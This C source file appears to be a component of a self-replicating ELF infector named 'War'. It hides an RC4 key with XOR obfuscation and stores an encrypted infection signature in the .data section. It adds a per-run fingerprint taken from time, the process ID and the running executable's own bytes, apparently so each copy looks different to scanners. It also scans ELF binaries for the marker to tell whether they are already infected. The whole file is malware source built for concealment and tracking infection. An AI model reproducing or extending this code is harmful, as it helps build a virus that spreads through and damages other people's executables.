#include "../include/war.h"

static const unsigned char OBFUSCATED_KEY[] = {
    0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
};
static const size_t KEY_LEN = 9;

static void deobfuscate_key(unsigned char *key_out) {
    for (size_t i = 0; i < KEY_LEN; i++) {
        key_out[i] = OBFUSCATED_KEY[i] ^ 0x42;
    }
}

__attribute__((section(".data")))
unsigned char ENCRYPTED_BASE_SIG[] = {
    0x99, 0xa4, 0x9c, 0x24, 0xb2, 0x0c, 0x56, 0x94,
    0xd0, 0xd5, 0x54, 0x9d, 0xdd, 0xbe, 0x91, 0xbf,
    0xbd, 0x77, 0x6b, 0x81, 0x66, 0x67, 0x00, 0x90,
    0x23, 0x8d, 0xcf, 0xf1, 0x53, 0x97, 0xb4, 0x42,
    0xbe, 0xeb, 0x34, 0x3a, 0x85, 0x1a, 0x89, 0xee,
    0xdd, 0x9a, 0x03, 0x2d, 0xfd, 0x5b, 0x14, 0x01,
    0xcc,
};
__attribute__((section(".data")))
unsigned char SIGNATURE_PADDING[32] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const size_t BASE_SIG_LEN = 49;

static uint32_t generate_fingerprint(void) {
    uint32_t seed = 0;
    
    seed ^= (uint32_t)time(NULL);
    seed ^= (uint32_t)getpid();
    seed ^= (uint32_t)(uintptr_t)&seed;
    
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd >= 0) {
        unsigned char entropy[8];
        lseek(fd, 0x100, SEEK_SET);
        read(fd, entropy, sizeof(entropy));
        close(fd);
        
        for (size_t i = 0; i < sizeof(entropy); i++) {
            seed ^= (entropy[i] << (i % 24));
        }
    }
    
    if (seed == 0) seed = 0xDEADBEEF;
    
    return seed;
}

const char *get_signature(void) {
    static char signature[MAX_SIGNATURE_LEN] = {0};
    static bool decrypted = false;
    
    if (!decrypted) {
        unsigned char rc4_key[KEY_LEN];
        deobfuscate_key(rc4_key);
        
        memcpy(signature, ENCRYPTED_BASE_SIG, BASE_SIG_LEN);
        rc4_crypt((unsigned char *)signature, BASE_SIG_LEN, rc4_key, KEY_LEN);
        
        uint32_t fingerprint = generate_fingerprint();
        size_t base_len = strlen(signature);
        
        snprintf(signature + base_len, 
                 MAX_SIGNATURE_LEN - base_len, 
                 "[%08X]", 
                 fingerprint);
        
        decrypted = true;
    }
    printf("signature en .c |%s|\n", signature);
    return signature;
}

bool is_infected(t_elf *elf) {

    const char base_marker[] = "War version 1.0";
    size_t marker_len = strlen(base_marker);
    
    for (size_t i = 0; i < elf->size - marker_len; i++) {
        if (memcmp(elf->data + i, base_marker, marker_len) == 0) {
            return true;
        }
    }
    
    return false;
}